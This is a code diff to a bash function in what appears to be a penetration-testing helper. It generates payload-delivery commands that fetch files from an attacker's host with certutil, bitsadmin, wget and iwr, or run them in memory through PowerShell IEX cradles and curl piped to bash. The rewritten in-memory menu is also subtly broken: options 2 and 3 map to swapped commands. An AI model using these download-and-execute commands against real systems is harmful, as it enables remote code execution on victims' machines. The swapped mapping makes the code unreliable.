@@ -83,31 +83,52 @@ nb-srv-file-download() {
     nb-vars-set-lport
     local filename && __askvar filename "FILENAME"
 
-    clear
+    __ask "Do you want to download the file to disk or download and execute it in memory? (d/e)"
+    local down && __askvar down "DOWNLOAD_OPTION"
 
-    __ask "Choose a command to copy:"
-    echo "1.  Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
-    echo "2.  powershell -c IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
-    echo "3.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
-    echo "4.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
-    echo "5.  curl $http://${__LHOST}:${__LPORT}/$filename | bash"
-    echo "6.  bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
-    echo "7.  powershell -c IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')"
-    echo "8.  Previous menu"
-    echo
-    echo -n "Choice: "
-    read choice
+    case $down in
+        d)
+            # Commands for downloading to disk
+            echo "Choose a command to copy:"
+            echo "1. iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
+            echo "2. certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
+            echo "3. wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
+            echo "4. bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
+            echo "5. Previous menu"
+            echo
+            echo -n "Choice: "
+            read choice
 
-    case $choice in
-        1) __COMMAND="Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
-        2) __COMMAND="powershell -c IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
-        3) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
-        4) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
-        5) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename | bash";;
-        6) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\Windows\\$filename";;
-        7) __COMMAND="powershell -c IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')";;
-        8) exit;;
-        *) echo "Invalid option";;
+            case $choice in
+                1) __COMMAND="Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
+                2) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
+                3) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
+                4) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
+                5) exit;;
+                *) echo "Invalid option"; exit;;
+            esac
+            ;;
+        e)
+            # Commands for downloading and executing in memory
+            echo "Choose a command to copy:"
+            echo "1. IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
+            echo "2. IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')"
+            echo "3. curl http://${__LHOST}:${__LPORT}/$filename | bash"
+            echo "4. Previous menu"
+            echo
+            echo -n "Choice: "
+            read choice
+
+            case $choice in
+                1) __COMMAND="powershell -c IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
+                2) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename | bash";;
+                3) __COMMAND="powershell -c IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')";;
+                4) exit;;
+                *) echo "Invalid option"; exit;;
+            esac
+            ;;
+        *)
+            echo "Invalid action choice"; exit;;
     esac
 
     echo "$__COMMAND" | wl-copy
